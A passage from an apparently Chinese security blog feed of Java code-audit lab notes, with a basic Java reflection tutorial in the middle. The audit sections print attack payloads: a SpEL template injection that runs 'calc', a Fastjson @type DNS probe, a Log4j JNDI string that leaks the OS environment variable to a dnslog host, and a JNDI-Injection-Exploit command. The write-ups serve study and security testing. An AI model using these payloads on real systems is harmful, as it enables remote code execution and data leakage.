src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938560525-c5051e71-ad99-42a4-98ac-c19fa5a7dbae.png"></p><p>点击一下刷新按钮抓包。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938578695-53b92c98-b1cb-49b0-8e09-1e901cd322b0.png"></p><p>注入参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__$&#123;<span class="keyword">new</span> java.util.<span class="title function_ invoke__">Scanner</span>(<span class="title function_ invoke__">T</span>(java.lang.Runtime).<span class="title function_ invoke__">getRuntime</span>().<span class="title function_ invoke__">exec</span>(<span class="string">&quot;calc&quot;</span>).<span class="title function_ invoke__">getInputStream</span>()).<span class="title function_ invoke__">next</span>()&#125;__::.x</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719938966749-87c16d50-111e-416c-8ca9-54172198c0a1.png"></p><h3 id="Jeecg-Xxe-XSteam"><a href="#Jeecg-Xxe-XSteam" class="headerlink" title="#Jeecg-Xxe&amp;XSteam"></a>#Jeecg-Xxe&amp;XSteam</h3><p>xml比较少，逐渐被json取代</p><p><a href="https://mp.weixin.qq.com/s/5hYQQBRhdoU5yxXMsDmClA">https://mp.weixin.qq.com/s/5hYQQBRhdoU5yxXMsDmClA</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719942427497-3672562f-26ab-4bdc-a482-9350cd5b41a5.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719942417887-6849b494-23d8-4bba-929c-7eab028a512c.png"></p><p>使用了第三方组件SAXReader，默认的解析方法会出现XXE 漏洞，接着查找相应控制层的代码，是否调用了该方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719942394550-eb85234a-bd0c-45c1-91cd-1d0ce7c00b87.png"></p><h3 id="Halo-RCE-SSRF"><a href="#Halo-RCE-SSRF" class="headerlink" title="#Halo- RCE&amp;SSRF"></a>#Halo- RCE&amp;SSRF</h3><p>RuntimeUtil-&gt;remoteAddr-&gt;admin&#x2F;themes&#x2F;clone-&gt;在线拉取主题</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反射基础(一)</title>
      <link href="/2024/11/05/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%B0%84(1)/"/>
      <url>/2024/11/05/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%B0%84(1)/</url>
      
        <content type="html"><![CDATA[<h1 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h1><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2023/png/25663185/1683432016646-0893cf9b-fd78-461b-8c17-8344efa880db.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2023/png/25663185/1683432045564-73a8c04a-6482-4cda-965a-23031f8be4d1.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2023/png/25663185/1683432053646-eeaaa8c8-9a62-42b3-ac08-42db3b5caecd.png"></p><h2 id="1、什么是Java反射"><a href="#1、什么是Java反射" class="headerlink" title="1、什么是Java反射"></a>1、什么是Java反射</h2><p>参考：<a href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a></p><p>Java提供了一套反射API，该API由Class类与java.lang.reflect类库组成。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740707673708-496bacc7-b5ff-4c07-8c9e-8ad2dc77791d.png"></p><p>该类库包含了Field、Method、Constructor等类。</p><p>对成员变量，成员方法和构造方法的信息进行的编程操作可以理解为反射机制。</p><h2 id="2、为什么要用到反射"><a href="#2、为什么要用到反射" class="headerlink" title="2、为什么要用到反射"></a>2、为什么要用到反射</h2><p>参考：<a href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a></p><p>其实从官方定义中就能找到其存在的价值，在运行时获得程序或程序集中每一个类型的成员和成员的信息，从而动态的创建、修改、调用、获取其属性，而不需要事先知道运行的对象是谁。划重点：在运行时而不是编译时。（不改变原有代码逻辑，自行运行的时候动态创建和编译即可）</p><h2 id="3、反射机制应用"><a href="#3、反射机制应用" class="headerlink" title="3、反射机制应用"></a>3、反射机制应用</h2><p>开发应用场景：</p><p>Spring框架的IOC基于反射创建对象和设置依赖属性。</p><p>SpringMVC的请求调用对应方法，也是通过反射。</p><p>JDBC的Class#forName(String className)方法，也是使用反射。</p><p>安全应用场景：</p><p>构造利用链，触发命令执行</p><p>反序列化中的利用链构造</p><p>动态获取或执行任意类中的属性或方法</p><p>动态代理的底层原理是反射技术</p><p>rmi反序列化也涉及到反射操作</p><h3 id="Java-反射-Class对象类获取普通用户我们可以采用以下方法创建实例："><a href="#Java-反射-Class对象类获取普通用户我们可以采用以下方法创建实例：" class="headerlink" title="#Java-反射-Class对象类获取普通用户我们可以采用以下方法创建实例："></a>#Java-反射-Class对象类获取普通用户我们可以采用以下方法创建实例：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person test = new Person();</span><br></pre></td></tr></table></figure><p>而我们在创建class类的实例对象却不能使用上述方法，运行会抛出错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class test = new Class();</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740711965874-3170e5a0-c019-45be-9cfe-f2418045fd7b.png"></p><p>跟进Class类的源码进行查看，发现其构造器是私有的，所以只有JVM能够创建Class对象。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740712020504-be8d22b0-39e2-483a-926a-e5e071c26c5e.png"></p><p>因为Class类是private私有属性，我们也无法通过创建对象的方式来获取class对象，那么我们怎样才能够获取到class对象呢？一般我们获取class对象就有以下几种方法，我们来逐一看看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//1、根据类名：类名.class</span><br><span class="line">Class userClass =User.class;</span><br><span class="line">//2、根据对象：对象.getClass()</span><br><span class="line">User user =new User();</span><br><span class="line">Class aClass = user.getClass();</span><br><span class="line">//3、根据全限定类名：Class.forName(&quot;全路径类名&quot;)</span><br><span class="line">Class aClass1 =Class.forName(&quot;com.example.reflectdemo.User&quot;);</span><br><span class="line">//4、通过类加载器获得Class对象：//ClassLoader.getSystemClassLoader().loadClass(&quot;全路径类名&quot;);</span><br><span class="line">ClassLoader clsload=ClassLoader.getSystemClassLoader();</span><br><span class="line">Class aClass2 = clsload.loadClass(&quot;com.example.reflectdemo.User&quot;);</span><br></pre></td></tr></table></figure><p>实现代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public class ReflectTemo &#123;  </span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;  </span><br><span class="line">        //1、类的.class属性  </span><br><span class="line">        Class c1 = ReflectTemo.class;  </span><br><span class="line">        System.out.println(c1.getName());  </span><br><span class="line">  </span><br><span class="line">        //2、实例化对象的getClass()方法  </span><br><span class="line">        ReflectTemo demo = new ReflectTemo();  </span><br><span class="line">        Class c2 = demo.getClass();  </span><br><span class="line">        System.out.println(c2.getName());  </span><br><span class="line">  </span><br><span class="line">        //3、Class.forName(String className): 动态加载类  </span><br><span class="line">        Class c3 = Class.forName(&quot;org.example.ReflectTemo&quot;);  </span><br><span class="line">        System.out.println(c3.getName());  </span><br><span class="line">        //4、通过类加载器获得Class对象：//ClassLoader.getSystemClassLoader().loadClass(&quot;全路径类名&quot;);  </span><br><span class="line">        ClassLoader c4=ClassLoader.getSystemClassLoader();  </span><br><span class="line">        Class aClass2 = c4.loadClass(&quot;org.example.ReflectTemo&quot;);  </span><br><span class="line">        System.out.println(aClass2.getName());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740712758387-afa09f02-4a77-4d92-8e92-36036f0b3bf2.png"></p><h3 id="Java-反射-Field成员变量类获取"><a href="#Java-反射-Field成员变量类获取" class="headerlink" title="#Java-反射-Field成员变量类获取"></a>#Java-反射-Field成员变量类获取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//Class aClass = Class.forName(&quot;com.example.reflectdemo.User&quot;);</span><br><span class="line">//获取公共成员变量对象</span><br><span class="line">// Field[] fields=aClass.getFields();</span><br><span class="line">// for(Field f:fields)&#123;</span><br><span class="line">// System.out.println(f);</span><br><span class="line">// &#125; </span><br><span class="line">//获取所有成员变量对象</span><br><span class="line">// Field[] fields=aClass.getDeclaredFields();</span><br><span class="line">// for(Field f:fields)&#123;</span><br><span class="line">// System.out.println(f);</span><br><span class="line">// &#125;</span><br><span class="line">//获取公共，私有单个成员变量对象</span><br><span class="line">// Field field=aClass.getField(&quot;age&quot;);</span><br><span class="line">// Field field=aClass.getDeclaredField(&quot;gender&quot;);</span><br><span class="line">// System.out.println(field);</span><br><span class="line">//城边变量值获取和赋值</span><br><span class="line">// User u = new User();</span><br><span class="line">// Field field=aClass.getField(&quot;age&quot;);</span><br><span class="line">// field.set(u,30);</span><br><span class="line">// Object a=field.get(u);</span><br><span class="line">// System.out.println(a);</span><br></pre></td></tr></table></figure><p>实现代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public class ReflectTemo &#123;</span><br><span class="line">    public String name;</span><br><span class="line">    public String profession;</span><br><span class="line">    protected int age;</span><br><span class="line">    private String number;</span><br><span class="line">    char sex;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException &#123;</span><br><span class="line">        Class aClass = Class.forName(&quot;org.example.ReflectTemo&quot;);</span><br><span class="line">//        获取公共成员变量对象</span><br><span class="line">        Field[] fields = aClass.getFields();</span><br><span class="line">        for (Field f : fields) &#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;-------分割线---------&quot;);</span><br><span class="line">//        获取所有成员变量对象</span><br><span class="line">        Field[] fields1 = aClass.getDeclaredFields();</span><br><span class="line">        for (Field f : fields1) &#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;-------分割线---------&quot;);</span><br><span class="line">//        获取公共，私有单个成员变量对象</span><br><span class="line">        Field field = aClass.getField(&quot;name&quot;);</span><br><span class="line">        Field field1 = aClass.getDeclaredField(&quot;number&quot;);</span><br><span class="line">        System.out.println(field.getName());</span><br><span class="line">        System.out.println(field1.getName());</span><br><span class="line">        System.out.println(&quot;-------分割线---------&quot;);</span><br><span class="line">//        获取指定成员变量</span><br><span class="line">        Field field2 = aClass.getDeclaredField(&quot;age&quot;);</span><br><span class="line">        System.out.println(field2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742375801741-d4ccab19-7084-4692-b88d-150190aee5e1.png"></p><h3 id="Java-反射-Method成员方法类获取"><a href="#Java-反射-Method成员方法类获取" class="headerlink" title="Java-反射-Method成员方法类获取"></a>Java-反射-Method成员方法类获取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//Class aClass = Class.forName(&quot;com.example.reflectdemo.User&quot;);</span><br><span class="line">//返回所有公共成员方法对象的数组，包括继承的</span><br><span class="line">// Method[] methods = aClass.getMethods();</span><br><span class="line">// for (Method me:methods)&#123;</span><br><span class="line">// System.out.println(me);</span><br><span class="line">// &#125;</span><br><span class="line">//返回所有成员方法对象的数组，不包括继承的</span><br><span class="line">// Method[] methods = aClass.getDeclaredMethods();</span><br><span class="line">// for (Method me:methods)&#123;</span><br><span class="line">// System.out.println(me);</span><br><span class="line">// &#125;</span><br><span class="line">//返回单个公共成员方法对象</span><br><span class="line">// Method methods = aClass.getMethod(&quot;getName&quot;);</span><br><span class="line">// System.out.println(methods);</span><br><span class="line">// Method methods = aClass.getMethod(&quot;setName&quot;, String.class);</span><br><span class="line">// System.out.println(methods);</span><br><span class="line">//返回单个成员方法对象</span><br><span class="line">// Method methods = aClass.getDeclaredMethod(&quot;UserInfo&quot;, String.class, int.class, String.class);</span><br><span class="line">// System.out.println(methods);</span><br><span class="line">//运行方法invoke</span><br><span class="line">// Method methods = aClass.getDeclaredMethod(&quot;UserInfo&quot;, String.class, int.class, String.class);</span><br><span class="line">// User u = new User();</span><br><span class="line">// //私有需要开启临时</span><br><span class="line">// methods.setAccessible(true);</span><br><span class="line">// methods.invoke(u,&quot;calmsec&quot;,18,&quot;man&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">public class ReflectTemo &#123;</span><br><span class="line">    public void study(String s) &#123;</span><br><span class="line">        System.out.println(&quot;学习中...&quot; + s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected void run() &#123;</span><br><span class="line">        System.out.println(&quot;跑步中...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void eat() &#123;</span><br><span class="line">        System.out.println(&quot;吃饭中...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private String sleep(int age) &#123;</span><br><span class="line">        System.out.println(&quot;睡眠中...&quot; + age);</span><br><span class="line">        return &quot;sleep&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class c = Class.forName(&quot;org.example.ReflectTemo&quot;); // 创建Class对象</span><br><span class="line">            Method[] methods1 = c.getDeclaredMethods(); // 获取所有该类中的所有方法</span><br><span class="line">            Method[] methods2 = c.getMethods(); // 获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</span><br><span class="line"></span><br><span class="line">            for (Method m:methods1) &#123;</span><br><span class="line">                System.out.println(m);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;-------分割线---------&quot;);</span><br><span class="line"></span><br><span class="line">            for (Method m:methods2) &#123;</span><br><span class="line">                System.out.println(m);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;-------分割线---------&quot;);</span><br><span class="line"></span><br><span class="line">            Method methods3 = c.getMethod(&quot;study&quot;, String.class); // 获取公有方法</span><br><span class="line">            System.out.println(methods3);</span><br><span class="line">            System.out.println(&quot;-------分割线---------&quot;);</span><br><span class="line"></span><br><span class="line">            Method method4 = c.getDeclaredMethod(&quot;sleep&quot;, int.class); // 获取私有方法</span><br><span class="line">            System.out.println(method4);</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742431869599-b1276c67-78bd-4aee-aef5-d8e65f36429e.png"></p><h3 id="Java-反射-Constructor构造方法类获取"><a href="#Java-反射-Constructor构造方法类获取" class="headerlink" title="#Java-反射-Constructor构造方法类获取"></a>#Java-反射-Constructor构造方法类获取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//Class aClass = Class.forName(&quot;com.example.reflectdemo.User&quot;);</span><br><span class="line">//返回所有公共构造方法对象的数组</span><br><span class="line">// Constructor[] constructors = aClass.getConstructors();</span><br><span class="line">// for(Constructor con:constructors)&#123;</span><br><span class="line">// System.out.println(con);</span><br><span class="line">// &#125;</span><br><span class="line">//返回所有构造方法对象的数组</span><br><span class="line">// Constructor[] constructors = aClass.getDeclaredConstructors();</span><br><span class="line">// for(Constructor con:constructors)&#123;</span><br><span class="line">// System.out.println(con);</span><br><span class="line">// &#125;</span><br><span class="line">//返回单个公共构造方法对象</span><br><span class="line">// Constructor con1=aClass.getConstructor();</span><br><span class="line">// Constructor con1=aClass.getConstructor(String.class);</span><br><span class="line">// System.out.println(con1);</span><br><span class="line">//返回单个构造方法对象</span><br><span class="line">// Constructor con2=aClass.getDeclaredConstructor(int.class);</span><br><span class="line">//Constructor con2=aClass.getDeclaredConstructor(String.class,int.class, String.class);</span><br><span class="line">// System.out .println(con2);</span><br><span class="line">// Constructor con2=aClass.getDeclaredConstructor(int.class);</span><br><span class="line">// con2.setAccessible(true);</span><br><span class="line">// User uu=(User) con2.newInstance(&quot;calmsec&quot;,30,&quot;man&quot;);</span><br><span class="line">// System.out.println(uu);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public class ReflectTemo &#123;</span><br><span class="line">    public  ReflectTemo() &#123;</span><br><span class="line">        System.out.println(&quot;无参构造函数&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public ReflectTemo(String name) &#123;</span><br><span class="line">        System.out.println(&quot;有参构造函数&quot; + name);</span><br><span class="line">    &#125;</span><br><span class="line">    private ReflectTemo(boolean n) &#123;</span><br><span class="line">        System.out.println(&quot;私有构造函数&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class c1 = Class.forName(&quot;org.example.ReflectTemo&quot;);</span><br><span class="line">            Constructor[] constructors1  = c1.getDeclaredConstructors();</span><br><span class="line">            Constructor[] constructors2 = c1.getConstructors();</span><br><span class="line">            for (Constructor c : constructors1) &#123;</span><br><span class="line">                System.out.println(c);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(&quot;-------分割线---------&quot;);</span><br><span class="line">            for (Constructor c : constructors2) &#123;</span><br><span class="line">                System.out.println(c);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(&quot;-------分割线---------&quot;);</span><br><span class="line">            Constructor constructors3 = c1.getConstructor(String.class);</span><br><span class="line">            System.out.println(constructors3);</span><br><span class="line">            System.out.println(&quot;-------分割线---------&quot;);</span><br><span class="line">            Constructor constructors4 = c1.getDeclaredConstructor(boolean.class);</span><br><span class="line">            System.out.println(constructors4);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742436831734-e45beeca-3799-4164-870a-01be2eaf3fb1.png"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> web </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> 安全研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java代码审计-开发组件</title>
      <link href="/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/"/>
      <url>/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="开发组件"><a href="#开发组件" class="headerlink" title="开发组件"></a>开发组件</h1><h2 id="第三方组件安全"><a href="#第三方组件安全" class="headerlink" title="第三方组件安全"></a>第三方组件安全</h2><p>1、找存在漏洞的第三方组件（PackageChecker插件）</p><p>2、找组件漏洞利用入口条件（根据网上已知漏洞复现条件）</p><p>3、找可控地方进行测试检测（根据网上已知漏洞利用条件）</p><p>常见第三方组件或框架漏洞列表：</p><p>SolrShiroFastjsonJacksonLog4jSnakeYamlHessianH2database</p><p>Xsteam、Druid、Struts2、Flink、Flume、Dubbo、Redis、Logstash、ElasticSearch、Kafka、Ghidra、Minecraft、Hive、Datax、Streaming、DolphinScheduler、Storm、Spring等。</p><p>运用插件</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719243983388-a7d78ab4-e7c9-4f17-9049-7fe0816dd5cc.png"></p><p>勾选</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244030199-121e5e16-585a-4bd0-88ec-8961d9a99b4c.png"></p><p>这样就会提示</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244070658-c66e2614-6490-4815-810b-dba10a0d2c8f.png"></p><h3 id="Tmall-Fastjson1-2-58"><a href="#Tmall-Fastjson1-2-58" class="headerlink" title="Tmall-Fastjson1.2.58"></a>Tmall-Fastjson1.2.58</h3><p>触发点：JSON.parseObject() JSON.parse()</p><p>全局搜索-&gt;JSON.parseObject()-&gt;propertyJson-&gt;admin&#x2F;product</p><p>{“@type”:”java.net.Inet4Address”,”val”:”miyvosnszc.dgrh3.cn”}</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244578596-1816367c-940a-4e2c-997c-1d4fa43f9241.png"></p><p>propertyJson可控</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244596375-aa5ef740-ca3a-43ed-ba05-7a3c9945b450.png"></p><p>访问路由</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244647757-9a4585ed-6ad1-4a94-bcbd-10f47640f0f6.png"></p><p>这边不能上传，再回到admin页面查找</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244690165-bc5c146e-d880-455f-af22-4b51fddd76ad.png"></p><p>随便填填保存再抓包</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244816852-5ac54e4a-a51f-4089-85c3-d30d7fee096b.png"></p><p>修改箭头指向部分{“@type”:”java.net.Inet4Address”,”val”:”miyvosnszc.dgrh3.cn”}</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719245334211-3075037b-68a9-4802-b856-39a6c49003a3.png"></p><h3 id="Tmall-Log4j2-10-0"><a href="#Tmall-Log4j2-10-0" class="headerlink" title="Tmall-Log4j2.10.0"></a>Tmall-Log4j2.10.0</h3><p>触发点：logger.error logger.info</p><p>全局搜索-&gt;logger.info-&gt;originalFileName-&gt;admin&#x2F;uploadAdminHeadImage</p><p>${jndi:ldap:&#x2F;&#x2F;${env:OS}.mq6bqf.dnslog.cn}</p><p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C”calc”</p><p>搜logger.info函数，里面还要有可控变量</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246014790-96fc113c-cbd5-44d9-b91b-2af618bffb31.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246149359-e5c5cd62-aeab-4dbd-9ac0-e501c8c6b043.png"></p><p>自带方法获取文件名getOriginalFilename</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246130966-45676b2d-6d06-47b8-8314-505d73b4518e.png"></p><p>直接访问路由不行</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246296916-211f7537-a4db-490b-9297-dc174bee61e9.png"></p><p>根据方法名，猜测这里抓个包</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246329431-ce34bda2-a214-4c0a-bf56-0ca891d600db.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246398286-ce03de84-40f5-45d2-a823-bfb10045a853.png"></p><p>控制这里</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246475774-6898fd4a-a39d-432c-b4e4-89297381c25a.png"></p><p>${jndi:ldap:&#x2F;&#x2F;${env:OS}.vc8yl8.dnslog.cn}</p><p><img 